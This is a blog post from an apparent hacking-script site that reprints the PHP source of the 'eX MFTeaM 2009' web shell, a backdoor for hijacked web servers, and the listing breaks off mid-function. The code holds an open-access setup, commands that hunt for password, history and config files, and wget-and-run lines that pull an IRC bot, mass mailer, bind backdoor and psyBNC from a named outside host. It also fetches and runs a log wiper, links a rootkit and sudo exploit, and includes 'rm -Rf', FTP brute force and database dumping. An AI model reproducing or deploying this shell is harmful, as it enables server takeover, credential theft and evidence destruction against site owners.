---
id: 305
title: eX MFTeaM 2009 shell
author: admin
layout: post
guid: http://hackingscripts.com/?p=305
permalink: /ex-mfteam-2009-shell/
categories:
  - PHP
tags:
  - eX MFTeaM
  - PHP
---
eX MFTeaM 2009 shell by By FakoMast3r, CopyRight MFTeaM.

## eX MFTeaM 2009 shell Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;?php
#######################################
## eX MFTeaM 2009                    ##
define('sh_ver'," By FakoMast3r");           ##
##    CopyRight MFTeaM               ##
##     irc.midnightcr3w.com           ##
##    chan #midnightcr3w                       ##
#######################################
$sh_name = sh_name();                ##
#######################################
#$sh_mainurl        = "http://www.jemcknight.plus.com/";
$sh_mainurl        = "http://www.jemcknight.plus.com/";
$exsh_updateurl  = $sh_mainurl."exsh_update.php";
$exsh_sourcesurl = $sh_mainurl."exsh.txt";
$sh_sourcez = array(
 "Rfi-Bot"   =&gt; array($sh_mainurl."ssess_0296317ca2b10940f6c11c59805b4dde"),
  "Mass Mailer"   =&gt; array($sh_mainurl."libyex.php"),
  "exSh"   =&gt; array($sh_mainurl."exsh.txt"),
  "psyBNC"   =&gt; array($sh_mainurl."psy.tar.gz"),
);
##[ AUTHENTICATION ]##
$auth = array(
  "login"     =&gt; "",
  "pass"      =&gt; "",
  "md5pass"   =&gt; "",
  "hostallow" =&gt; array("*"),
  "denied"    =&gt; "&lt;a href=\"$sh_mainurl\"&gt;".$sh_name."&lt;/a&gt;: access denied!",
);
##[ END AUTHENTICATION ]##
$curdir = "./";
$tmpdir = "";
$tmpdir_logs = "./";
$log_email = "edwis@live.com"; #Email logna
$sess_cookie = "exshcook";
$sort_default = "0a"; #Pengurutan, 0 - nomor kolom. "a"scending atau "d"escending
$sort_save = TRUE; #Simpan posisi pengurutan menggunakan cookies.
$usefsbuff = TRUE;
$copy_unset = FALSE; #Hapus file yg telah di-copy setelah dipaste
$surl_autofill_include = TRUE;
$updatenow   = FALSE;
$gzipencode  = TRUE;
$filestealth = TRUE; #TRUE, tidak merubah waktu modifikasi dan akses.
$hexdump_lines = 8;
$hexdump_rows = 24;
$millink = milw0rm();
$win = strtolower(substr(PHP_OS,0,3)) == "win";
$disablefunc = getdisfunc();
##[ END OF CONFIGS ]##
error_reporting(E_ERROR | E_PARSE);
@ini_set("max_execution_time",0);
@set_time_limit(0); #No Fx in SafeMode
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);
define("starttime",getmicrotime());
if (get_magic_quotes_gpc()) { strips($GLOBALS); }
$_REQUEST = array_merge($_COOKIE,$_GET,$_POST);
@$f = $_REQUEST["f"];
@extract($_REQUEST["exshcook"]);
foreach($_REQUEST as $k =&gt; $v) { if (!isset($$k)) { $$k = $v; } }
if ($surl_autofill_include) {
  $include = "&";
  foreach (explode("&",getenv("QUERY_STRING")) as $v) {
    $v = explode("=",$v);
    $name = urldecode($v[0]);
    $value = @urldecode($v[1]);
    foreach (array("http://","https://","ssl://","ftp://","\\\\") as $needle) {
      if (strpos($value,$needle) === 0) {
        $includestr .= urlencode($name)."=".urlencode($value)."&";
      }
    }
  }
}
if (empty($surl)) {
  $surl = "?".$includestr;
  $surl = htmlspecialchars($surl);
}
## FILE TYPES ##
$ftypes  = array(
  "html"     =&gt; array("html","htm","shtml"),
  "txt"      =&gt; array("txt","conf","bat","sh","js","bak","doc","log","sfc","cfg","htaccess"),
  "exe"      =&gt; array("sh","install","bat","cmd"),
  "ini"      =&gt; array("ini","inf","conf"),
  "code"     =&gt; array("php","phtml","php3","php4","inc","tcl","h","c","cpp","py","cgi","pl"),
  "img"      =&gt; array("gif","png","jpeg","jfif","jpg","jpe","bmp","ico","tif","tiff","avi","mpg","mpeg"),
  "sdb"      =&gt; array("sdb"),
  "phpsess"  =&gt; array("sess"),
  "download" =&gt; array("exe","com","pif","src","lnk","zip","rar","gz","tar")
);
$exeftypes  = array(
  getenv("PHPRC")." -q %f%" =&gt; array("php","php3","php4"),
  "perl %f%"                =&gt; array("pl","cgi")
);
$regxp_highlight  = array(
  array(basename($_SERVER["PHP_SELF"]),1,"&lt;font color=#FFFF00&gt;","&lt;/font&gt;"),
  array("\.tgz$",1,"&lt;font color=#C082FF&gt;","&lt;/font&gt;"),
  array("\.gz$",1,"&lt;font color=#C082FF&gt;","&lt;/font&gt;"),
  array("\.tar$",1,"&lt;font color=#C082FF&gt;","&lt;/font&gt;"),
  array("\.bz2$",1,"&lt;font color=#C082FF&gt;","&lt;/font&gt;"),
  array("\.zip$",1,"&lt;font color=#C082FF&gt;","&lt;/font&gt;"),
  array("\.rar$",1,"&lt;font color=#C082FF&gt;","&lt;/font&gt;"),
  array("\.php$",1,"&lt;font color=#00FF00&gt;","&lt;/font&gt;"),
  array("\.php3$",1,"&lt;font color=#00FF00&gt;","&lt;/font&gt;"),
  array("\.php4$",1,"&lt;font color=#00FF00&gt;","&lt;/font&gt;"),
  array("\.jpg$",1,"&lt;font color=#00FFFF&gt;","&lt;/font&gt;"),
  array("\.jpeg$",1,"&lt;font color=#00FFFF&gt;","&lt;/font&gt;"),
  array("\.JPG$",1,"&lt;font color=#00FFFF&gt;","&lt;/font&gt;"),
  array("\.JPEG$",1,"&lt;font color=#00FFFF&gt;","&lt;/font&gt;"),
  array("\.ico$",1,"&lt;font color=#00FFFF&gt;","&lt;/font&gt;"),
  array("\.gif$",1,"&lt;font color=#00FFFF&gt;","&lt;/font&gt;"),
  array("\.png$",1,"&lt;font color=#00FFFF&gt;","&lt;/font&gt;"),
  array("\.htm$",1,"&lt;font color=#00CCFF&gt;","&lt;/font&gt;"),
  array("\.html$",1,"&lt;font color=#00CCFF&gt;","&lt;/font&gt;"),
  array("\.txt$",1,"&lt;font color=#C0C0C0&gt;","&lt;/font&gt;")
);
## QUICK COMMANDS ##
if (!$win) {
  $cmdaliases = array(
    array("", "ls -al"),
    array("Find all suid files", "find / -type f -perm -04000 -ls"),
    array("Find suid files in current dir", "find . -type f -perm -04000 -ls"),
    array("Find all sgid files", "find / -type f -perm -02000 -ls"),
    array("Find sgid files in current dir", "find . -type f -perm -02000 -ls"),
    array("Find config.inc.php files", "find / -type f -name config.inc.php"),
    array("Find config* files", "find / -type f -name \"config*\""),
    array("Find config* files in current dir", "find . -type f -name \"config*\""),
    array("Find all writable folders and files", "find / -perm -2 -ls"),
    array("Find all writable folders and files in current dir", "find . -perm -2 -ls"),
    array("Find all writable folders", "find / -type d -perm -2 -ls"),
    array("Find all writable folders in current dir", "find . -type d -perm -2 -ls"),
    array("Find all service.pwd files", "find / -type f -name service.pwd"),
    array("Find service.pwd files in current dir", "find . -type f -name service.pwd"),
    array("Find all .htpasswd files", "find / -type f -name .htpasswd"),
    array("Find .htpasswd files in current dir", "find . -type f -name .htpasswd"),
    array("Find all .bash_history files", "find / -type f -name .bash_history"),
    array("Find .bash_history files in current dir", "find . -type f -name .bash_history"),
    array("Find all .fetchmailrc files", "find / -type f -name .fetchmailrc"),
    array("Find .fetchmailrc files in current dir", "find . -type f -name .fetchmailrc"),
    array("List file attributes on a Linux second extended file system", "lsattr -va"),
    array("Show opened ports", "netstat -an | grep -i listen")
  );
  $cmdaliases2 = array(
    array("wget & extract Rfi-Bot","wget ".$sh_mainurl."ssess_0296317ca2b10940f6c11c59805b4dde;perl ssess_0296317ca2b10940f6c11c59805b4dde"),
    array("wget & extract Mass Mailer","wget ".$sh_mainurl."libyex.php"),
    array("wget & extract psyBNC","wget ".$sh_mainurl."psy.tar.gz;tar -zxf fx.tgz;cd .psy;./config 50000;./fuck;./run"),
    array("-----",""),
    array("Logged in users","w"),
    array("Last to connect","lastlog"),
    array("Find Suid bins","find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2&gt; /dev/null"),
    array("User Without Password","cut -d: -f1,2,3 /etc/passwd | grep ::"),
    array("Can write in /etc/?","find /etc/ -type f -perm -o+w 2&gt; /dev/null"),
    array("Downloaders?","which wget curl w3m lynx fetch lwp-download"),
    array("CPU Info","cat /proc/version /proc/cpuinfo"),
    array("Is gcc installed ?","locate gcc"),
    array("Format box (DANGEROUS)","rm -Rf"),
    array("-----",""),
    array("wget WIPELOGS PT1","wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c"),
    array("gcc WIPELOGS PT2","gcc zap2.c -o zap2"),
    array("Run WIPELOGS PT3","./zap2"),
    array("-----",""),
    array("wget RatHole 1.2 (Linux & BSD)","wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz"),
    array("wget & run BindDoor","wget ".$sh_mainurl."bind.tgz;tar -zxvf bind.tgz;./4877"),
    array("wget Sudo Exploit","wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c"),
  );
}
else {
  $cmdaliases = array(
    array("", "dir"),
    array("Find index.php in current dir", "dir /s /w /b index.php"),
    array("Find *config*.php in current dir", "dir /s /w /b *config*.php"),
    array("Find c99shell in current dir", "find /c \"c99\" *"),
    array("Find r57shell in current dir", "find /c \"r57\" *"),
    array("Find exshell in current dir", "find /c \"ex\" *"),
    array("Show active connections", "netstat -an"),
    array("Show running services", "net start"),
    array("User accounts", "net user"),
    array("Show computers", "net view"),
  );
}
## PHP FILESYSTEM TRICKS (By eX) ##
$phpfsaliases = array(
    array("Read File", "read", 1, "File", ""),
    array("Write File (PHP5)", "write", 2, "File","Text"),
    array("Copy", "copy", 2, "From", "To"),
    array("Rename/Move", "rename", 2, "File", "To"),
    array("Delete", "delete", 1 ,"File", ""),
    array("Make Dir","mkdir", 1, "Dir", ""),
    array("Download", "download", 2, "URL", "To"),
    array("Download (Binary Safe)", "downloadbin", 2, "URL", "To"),
    array("Change Perm (0755)", "chmod", 2, "File", "Perms"),
    array("Find Writable Dir", "fwritabledir", 2 ,"Dir"),
    array("Find Pathname Pattern", "glob",2 ,"Dir", "Pattern"),
);
## QUICK LAUNCH ##
$quicklaunch1 = array(
    array("&lt;img src=\"".$surl."act=img&img=home\" alt=\"Home\" border=\"0\"&gt;",$surl),
    array("&lt;img src=\"".$surl."act=img&img=back\" alt=\"Back\" border=\"0\"&gt;","#\" onclick=\"history.back(1)"),
    array("&lt;img src=\"".$surl."act=img&img=forward\" alt=\"Forward\" border=\"0\"&gt;","#\" onclick=\"history.go(1)"),
    array("&lt;img src=\"".$surl."act=img&img=up\" alt=\"Up\" border=\"0\"&gt;",$surl."act=ls&d=%upd&sort=%sort"),
    array("&lt;img src=\"".$surl."act=img&img=search\" alt=\"Search\" border=\"0\"&gt;",$surl."act=search&d=%d"),
    array("&lt;img src=\"".$surl."act=img&img=buffer\" alt=\"Buffer\" border=\"0\"&gt;",$surl."act=fsbuff&d=%d")
);
$quicklaunch2 = array(
    array("Security Info",$surl."act=security&d=%d"),
    array("Processes",$surl."act=processes&d=%d"),
    array("MySQL",$surl."act=sql&d=%d"),
    array("Eval",$surl."act=eval&d=%d"),
    array("Encoder",$surl."act=encoder&d=%d"),
    array("Mailer",$surl."act=fxmailer"),
    array("milw0rm",$millink),
    array("Md5-Lookup","http://darkc0de.com/database/md5lookup.html"),
    array("Toolz",$surl."act=tools&d=%d"),
    array("Kill-Shell",$surl."act=selfremove"),
    array("Feedback",$surl."act=feedback"),
    array("Update",$surl."act=update"),
    array("About",$surl."act=about")
);
if (!$win) {
  $quicklaunch2[] = array("&lt;br&gt;FTP-Brute",$surl."act=ftpquickbrute&d=%d");
}
## HIGHLIGHT CODE ##
$highlight_background = "#C0C0C0";
$highlight_bg = "#FFFFFF";
$highlight_comment = "#6A6A6A";
$highlight_default = "#0000BB";
$highlight_html = "#1300FF";
$highlight_keyword = "#007700";
$highlight_string = "#000000";
####################
##[ AUTHENTICATE ]##
####################
$tmp = array();
foreach ($auth["hostallow"] as $k =&gt; $v) {
  $tmp[] = str_replace("\\*",".*",preg_quote($v));
}
$s = "!^(".implode("|",$tmp).")$!i";
if (!preg_match($s,getenv("REMOTE_ADDR")) and !preg_match($s,gethostbyaddr(getenv("REMOTE_ADDR")))) {
  exit("&lt;a href=\"$sh_mainurl\"&gt;$sh_name&lt;/a&gt;: Access Denied - Your host (".getenv("REMOTE_ADDR").") not allowed");
}
if (!empty($auth["login"])) {
  if (empty($auth["md5pass"])) { $auth["md5pass"] = md5($auth["pass"]); }
  if (($_SERVER["PHP_AUTH_USER"] != $auth["login"]) or (md5($_SERVER["PHP_AUTH_PW"]) != $auth["md5pass"])) {
    header("WWW-Authenticate: Basic realm=\"".$sh_name.": Restricted Area\"");
    header("HTTP/1.0 401 Unauthorized");
    die($auth["denied"]);
  }
}
## END AUTHENTICATE ##

if ($act != "img") {
  $lastdir = realpath(".");
  chdir($curdir);
  if ($updatenow) { @ob_clean(); exsh_getupdate(1); exit; }
  $sess_data = @unserialize($_COOKIE["$sess_cookie"]);
  if (!is_array($sess_data)) { $sess_data = array(); }
  if (!is_array($sess_data["copy"])) { $sess_data["copy"] = array(); }
  if (!is_array($sess_data["cut"])) { $sess_data["cut"] = array(); }
  ex_buff_prepare();
  foreach (array("sort","sql_sort") as $v) {
    if (!empty($_GET[$v])) {$$v = $_GET[$v];}
    if (!empty($_POST[$v])) {$$v = $_POST[$v];}
  }
  if ($sort_save) {
    if (!empty($sort)) {setcookie("sort",$sort);}
    if (!empty($sql_sort)) {setcookie("sql_sort",$sql_sort);}
  }
  if (!function_exists("posix_getpwuid") and !in_array("posix_getpwuid",$disablefunc)) {function posix_getpwuid($uid) {return FALSE;}}
  if (!function_exists("posix_getgrgid") and !in_array("posix_getgrgid",$disablefunc)) {function posix_getgrgid($gid) {return FALSE;}}
  if (!function_exists("posix_kill") and !in_array("posix_kill",$disablefunc)) {function posix_kill($gid) {return FALSE;}}
  if (!function_exists("mysql_dump")) {
    function mysql_dump($set) {
      global $sh_ver;
      $sock = $set["sock"];
      $db = $set["db"];
      $print = $set["print"];
      $nl2br = $set["nl2br"];
      $file = $set["file"];
      $add_drop = $set["add_drop"];
      $tabs = $set["tabs"];
      $onlytabs = $set["onlytabs"];
      $ret = array();
      $ret["err"] = array();
      if (!is_resource($sock)) {echo("Error: \$sock is not valid resource.");}
      if (empty($db)) {$db = "db";}
      if (empty($print)) {$print = 0;}
      if (empty($nl2br)) {$nl2br = 0;}
      if (empty($add_drop)) {$add_drop = TRUE;}
      if (empty($file)) {
        $file = $tmpdir."dump_".getenv("SERVER_NAME")."_".$db."_".date("d-m-Y-H-i-s").".sql";
      }
      if (!is_array($tabs)) {$tabs = array();}
      if (empty($add_drop)) {$add_drop = TRUE;}
      if (sizeof($tabs) == 0) {
        //Retrieve tables-list
        $res = mysql_query("SHOW TABLES FROM ".$db, $sock);
        if (mysql_num_rows($res) &gt; 0) {while ($row = mysql_fetch_row($res)) {$tabs[] = $row[0];}}
      }
      $out = "
      # Dumped by ".$sh_name."
      #
      # Host settings:
      # MySQL version: (".mysql_get_server_info().") running on ".getenv("SERVER_ADDR")." (".getenv("SERVER_NAME").")"."
      # Date: ".date("d.m.Y H:i:s")."
      # DB: \"".$db."\"
      #---------------------------------------------------------";
      $c = count($onlytabs);
      foreach($tabs as $tab) {
        if ((in_array($tab,$onlytabs)) or (!$c)) {
          if ($add_drop) {$out .= "DROP TABLE IF EXISTS `".$tab."`;\n";}
          //Receieve query for create table structure
          $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $sock);
          if (!$res) {$ret["err"][] = mysql_smarterror();}
          else {
            $row = mysql_fetch_row($res);
            $out .= $row["1"].";\n\n";
            //Receieve table variables
            $res = mysql_query("SELECT * FROM `$tab`", $sock);
            if (mysql_num_rows($res) &gt; 0) {
              while ($row = mysql_fetch_assoc($res)) {
                $keys = implode("`, `", array_keys($row));
                $values = array_values($row);
                foreach($values as $k=&gt;$v) {$values[$k] = addslashes($v);}
                $values = implode("', '", $values);
                $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES ('".$values."');\n";
                $out .= $sql;
              }
            }
          }
        }
      }
      $out .= "#---------------------------------------------------------------------------------\n\n";
      if ($file) {
        $fp = fopen($file, "w");
        if (!$fp) {$ret["err"][] = 2;}
        else {
          fwrite ($fp, $out);
          fclose ($fp);
        }
      }
      if ($print) {if ($nl2br) {echo nl2br($out);} else {echo $out;}}
      return $out;
    }
  }
  if (!function_exists("mysql_buildwhere")) {
    function mysql_buildwhere($array,$sep=" and",$functs=array()) {
      if (!is_array($array)) {$array = array();}
      $result = "";
      foreach($array as $k=&gt;$v) {
        $value = "";
        if (!empty($functs[$k])) {$value .= $functs[$k]."(";}
        $value .= "'".addslashes($v)."'";
        if (!empty($functs[$k])) {$value .= ")";}
        $result .= "`".$k."` = ".$value.$sep;
      }
      $result = substr($result,0,strlen($result)-strlen($sep));
      return $result;
    }
  }
  if (!function_exists("mysql_fetch_all")) {
    function mysql_fetch_all($query,$sock) {
      if ($sock) {$result = mysql_query($query,$sock);}
      else {$result = mysql_query($query);}
      $array = array();
      while ($row = mysql_fetch_array($result)) {$array[] = $row;}
      mysql_free_result($result);
      return $array;
    }
  }
  if (!function_exists("mysql_smarterror")) {
    function mysql_smarterror($type,$sock) {
      if ($sock) {$error = mysql_error($sock);}
      else {$error = mysql_error();}
      $error = htmlspecialchars($error);
      return $error;
    }
  }
  if (!function_exists("mysql_query_form")) {
    function mysql_query_form() {
      global $submit,$sql_act,$sql_query,$sql_query_result,$sql_confirm,$sql_query_error,$tbl_struct;
      if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;".$sql_query_error."&lt;br&gt;";}
      if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
      if ((!$submit) or ($sql_act)) {
        echo "&lt;table border=0&gt;&lt;tr&gt;&lt;td&gt;&lt;form name=\"exsh_sqlquery\" method=POST&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to";} else {echo "SQL-Query";} echo ":&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=sql_query cols=100 rows=10&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=hidden name=act value=sql&gt;&lt;input type=hidden name=sql_act value=query&gt;&lt;input type=hidden name=sql_tbl value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=hidden name=submit value=\"1\"&gt;&lt;input type=hidden name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"&gt;&lt;input type=submit name=sql_confirm value=\"Yes\"&gt; &lt;input type=submit value=\"No\"&gt;&lt;/form&gt;&lt;/td&gt;";
        if ($tbl_struct) {
          echo "&lt;td valign=\"top\"&gt;&lt;b&gt;Fields:&lt;/b&gt;&lt;br&gt;";
          foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "+ &lt;a href=\"#\" onclick=\"document.exsh_sqlquery.sql_query.value+='`".$name."`';\"&gt;&lt;b&gt;".$name."&lt;/b&gt;&lt;/a&gt;&lt;br&gt;";}
          echo "&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
        }
      }
      if ($sql_query_result or (!$sql_confirm)) {$sql_query = $sql_last_query;}
    }
  }
  if (!function_exists("mysql_create_db")) {
    function mysql_create_db($db,$sock="") {
      $sql = "CREATE DATABASE `".addslashes($db)."`;";
      if ($sock) {return mysql_query($sql,$sock);}
      else {return mysql_query($sql);}
    }
  }
  if (!function_exists("mysql_query_parse")) {
    function mysql_query_parse($query) {
      $query = trim($query);
      $arr = explode (" ",$query);
      $types = array(
        "SELECT"=&gt;array(3,1),
        "SHOW"=&gt;array(2,1),
        "DELETE"=&gt;array(1),
        "DROP"=&gt;array(1)
      );
      $result = array();
      $op = strtoupper($arr[0]);
      if (is_array($types[$op])) {
        $result["propertions"] = $types[$op];
        $result["query"]  = $query;
        if ($types[$op] == 2) {
          foreach($arr as $k=&gt;$v) {
            if (strtoupper($v) == "LIMIT") {
              $result["limit"] = $arr[$k+1];
              $result["limit"] = explode(",",$result["limit"]);
              if (count($result["limit"]) == 1) {$result["limit"] = array(0,$result["limit"][0]);}
              unset($arr[$k],$arr[$k+1]);
            }
          }
        }
      }
      else {return FALSE;}
    }
  }
  if ($act == "gofile") {
    if (is_dir($f)) { $act = "ls"; $d = $f; }
    else { $act = "f"; $d = dirname($f); $f = basename($f); }
  }
  ## HEADERS ##
  @ob_start();
  @ob_implicit_flush(0);
  header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
  header("Last-Modified: ".gmdate("D, d M Y H:i:s")." GMT");
  header("Cache-Control: no-store, no-cache, must-revalidate");
  header("Cache-Control: post-check=0, pre-check=0", FALSE);
  header("Pragma: no-cache");
  if (empty($tmpdir)) {
    $tmpdir = ini_get("upload_tmp_dir");
    if (is_dir($tmpdir)) {$tmpdir = "/tmp/";}
  }
  $tmpdir = realpath($tmpdir);
  $tmpdir = str_replace("\\",DIRECTORY_SEPARATOR,$tmpdir);
  if (substr($tmpdir,-1) != DIRECTORY_SEPARATOR) {$tmpdir .= DIRECTORY_SEPARATOR;}
  if (empty($tmpdir_logs)) {$tmpdir_logs = $tmpdir;}
  else {$tmpdir_logs = realpath($tmpdir_logs);}
  $sort = htmlspecialchars($sort);
  if (empty($sort)) {$sort = $sort_default;}
  $sort[1] = strtolower($sort[1]);
  $DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");
  if (!ereg("PHP/".phpversion(),$DISP_SERVER_SOFTWARE)) {$DISP_SERVER_SOFTWARE .= ". PHP/".phpversion();}
  $DISP_SERVER_SOFTWARE = str_replace("PHP/".phpversion(),"&lt;a href=\"".$surl."act=phpinfo\" target=\"_blank\"&gt;&lt;b&gt;&lt;u&gt;PHP/".phpversion()."&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;",htmlspecialchars($DISP_SERVER_SOFTWARE));
  @ini_set("highlight.bg",$highlight_bg);
  @ini_set("highlight.comment",$highlight_comment);
  @ini_set("highlight.default",$highlight_default);
  @ini_set("highlight.html",$highlight_html);
  @ini_set("highlight.keyword",$highlight_keyword);
  @ini_set("highlight.string",$highlight_string);
  if (!is_array($actbox)) { $actbox = array(); }
  $dspact = $act = htmlspecialchars($act);
  $disp_fullpath = $ls_arr = $notls = null;
  $ud = @urlencode($d);
  if (empty($d)) {$d = realpath(".");}
  elseif(realpath($d)) {$d = realpath($d);}
  $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
  if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;}
  $d = str_replace("\\\\","\\",$d);
  $dispd = htmlspecialchars($d);
  $safemode = safemode();
  if ($safemode) {
    $hsafemode = "&lt;font color=#3366FF&gt;&lt;b&gt;SAFE MODE IS ON&lt;/b&gt;&lt;/font&gt;";
    $safemodeexecdir = @ini_get("safe_mode_exec_dir");
  }
  else { $hsafemode = "&lt;font color=#FF9900&gt;&lt;b&gt;SAFE MODE IS OFF&lt;/b&gt;&lt;/font&gt;"; }
  $v = @ini_get("open_basedir");
  if ($v or strtolower($v) == "on") {
    $openbasedir = TRUE;
    $hopenbasedir = "&lt;font color=red&gt;".$v."&lt;/font&gt;";
  }
  else {
    $openbasedir = FALSE;
    $hopenbasedir = "&lt;font color=green&gt;OFF (not secure)&lt;/font&gt;";
  }
  
##################
##[ HTML START ]##
##################
function srv_info($title,$contents) {
  echo "&lt;tr&gt;&lt;th&gt;$title&lt;/th&gt;&lt;td&gt;:&lt;/td&gt;&lt;td&gt;$contents&lt;/td&gt;&lt;/tr&gt;\n";
}
echo htmlhead($hsafemode);
echo "&lt;table id=pagebar&gt;";
echo "&lt;tr&gt;&lt;td colspan=2&gt;\n";
echo "&lt;div class=fleft&gt;$hsafemode&lt;/div&gt;\n";
echo "&lt;div class=fright&gt;";
echo "IP Address: &lt;a href=\"http://ws.arin.net/cgi-bin/whois.pl?queryinput=".@gethostbyname($_SERVER["HTTP_HOST"])."\"&gt;".@gethostbyname($_SERVER["HTTP_HOST"])."&lt;/a&gt; ".
     "You: &lt;a href=\"http://ws.arin.net/cgi-bin/whois.pl?queryinput=".$_SERVER["REMOTE_ADDR"]."\"&gt;".$_SERVER["REMOTE_ADDR"]."&lt;/a&gt; ".
     ($win?"Drives: ".disp_drives($d,$surl):"");
echo "&lt;/div&gt;\n&lt;/td&gt;&lt;/tr&gt;\n";
echo "&lt;tr&gt;&lt;td width=50%&gt;\n";
echo "&lt;table class=info&gt;\n";
srv_info("Software","".$DISP_SERVER_SOFTWARE);
srv_info("Uname",php_uname());
srv_info("User",($win) ? get_current_user()." (uid=".getmyuid()." gid=".getmygid().")" : exexec("id"));
echo "&lt;/table&gt;&lt;/td&gt;\n".
     "&lt;td width=50%&gt;\n";
echo "&lt;table class=info&gt;\n";
srv_info("Freespace",disp_freespace($d));
echo "&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;\n";
echo "&lt;tr&gt;&lt;td colspan=2&gt;\n";
echo get_status();
echo "&lt;/td&gt;&lt;/tr&gt;\n";
echo "&lt;tr&gt;&lt;td colspan=2&gt;\n";
echo $safemodeexecdir ? "SafemodeExecDir: ".$safemodeexecdir."&lt;br&gt;\n" : "";
echo showdisfunc() ? "DisFunc: ".showdisfunc()."\n" : "";
echo "&lt;/td&gt;&lt;/tr&gt;\n";
echo "&lt;tr&gt;&lt;td colspan=2 id=mainmenu&gt;\n";
if (count($quicklaunch2) &gt; 0) {
  foreach($quicklaunch2 as $item) {
    $item[1] = str_replace("%d",urlencode($d),$item[1]);
    $item[1] = str_replace("%sort",$sort,$item[1]);
    $v = realpath($d."..");
    if (empty($v)) {
      $a = explode(DIRECTORY_SEPARATOR,$d);
      unset($a[count($a)-2]);
      $v = join(DIRECTORY_SEPARATOR,$a);
    }
    $item[1] = str_replace("%upd",urlencode($v),$item[1]);
    echo "&lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt;\n";
  }
}
echo "&lt;/td&gt;\n".
     "&lt;tr&gt;&lt;td colspan=2 id=mainmenu&gt;\n";
if (count($quicklaunch1) &gt; 0) {
  foreach($quicklaunch1 as $item) {
    $item[1] = str_replace("%d",urlencode($d),$item[1]);
    $item[1] = str_replace("%sort",$sort,$item[1]);
    $v = realpath($d."..");
    if (empty($v)) {
      $a = explode(DIRECTORY_SEPARATOR,$d);
      unset($a[count($a)-2]);
      $v = join(DIRECTORY_SEPARATOR,$a);
    }
    $item[1] = str_replace("%upd",urlencode($v),$item[1]);
    echo "&lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt;\n";
  }
}
echo "&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td colspan=2&gt;";
echo "&lt;p class=fleft&gt;\n";
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,-1));
$i = 0;
foreach($pd as $b) {
  $t = ""; $j = 0;
  foreach ($e as $r) {
    $t.= $r.DIRECTORY_SEPARATOR;
    if ($j == $i) { break; }
    $j++;
  }
  echo "&lt;a href=\"".$surl."act=ls&d=".urlencode($t)."&sort=".$sort."\"&gt;&lt;font color=yellow&gt;".htmlspecialchars($b).DIRECTORY_SEPARATOR."&lt;/font&gt;&lt;/a&gt;\n";
  $i++;
}
echo " - ";
if (is_writable($d)) {
  $wd = TRUE;
  $wdt = "&lt;font color=#00FF00&gt;[OK]&lt;/font&gt;";
  echo "&lt;b&gt;&lt;font color=green&gt;".view_perms(fileperms($d))."&lt;/font&gt;&lt;/b&gt;";
}
else {
  $wd = FALSE;
  $wdt = "&lt;font color=red&gt;[Read-Only]&lt;/font&gt;";
  echo "&lt;b&gt;".view_perms_color($d)."&lt;/b&gt;";
}
echo "\n&lt;/p&gt;\n";
?&gt;
&lt;div class=fright&gt;
&lt;form method="POST"&gt;&lt;input type=hidden name=act value="ls"&gt;
Directory: &lt;input type="text" name="d" size="50" value="&lt;?php echo $dispd; ?&gt;"&gt; &lt;input type=submit value="Go"&gt;
&lt;/form&gt;
&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;?php
/***********************/
/** INFORMATION TABLE **/
/***********************/
echo "&lt;table id=maininfo&gt;&lt;tr&gt;&lt;td width=\"100%\"&gt;\n";
if ($act == "") { $act = $dspact = "ls"; }
if ($act == "sql") {
  $sql_surl = $surl."act=sql";
  if ($sql_login)  {$sql_surl .= "&sql_login=".htmlspecialchars($sql_login);}
  if ($sql_passwd) {$sql_surl .= "&sql_passwd=".htmlspecialchars($sql_passwd);}
  if ($sql_server) {$sql_surl .= "&sql_server=".htmlspecialchars($sql_server);}
  if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
  if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
  $sql_surl .= "&";
  echo "&lt;h4&gt;Attention! MySQL Manager is &lt;u&gt;NOT&lt;/u&gt; a ready module! Don't reports bugs.&lt;/h4&gt;".
       "&lt;table&gt;".
       "&lt;tr&gt;&lt;td width=\"100%\" colspan=2 class=barheader&gt;";
  if ($sql_server) {
    $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
    $err = mysql_smarterror();
    @mysql_select_db($sql_db,$sql_sock);
    if ($sql_query and $submit) {$sql_query_result = mysql_query($sql_query,$sql_sock); $sql_query_error = mysql_smarterror();}
  }
  else {$sql_sock = FALSE;}
  echo ".: SQL Manager :.&lt;br&gt;";
  if (!$sql_sock) {
    if (!$sql_server) {echo "NO CONNECTION";}
    else {echo "Can't connect! ".$err;}
  }
  else {
    $sqlquicklaunch = array();
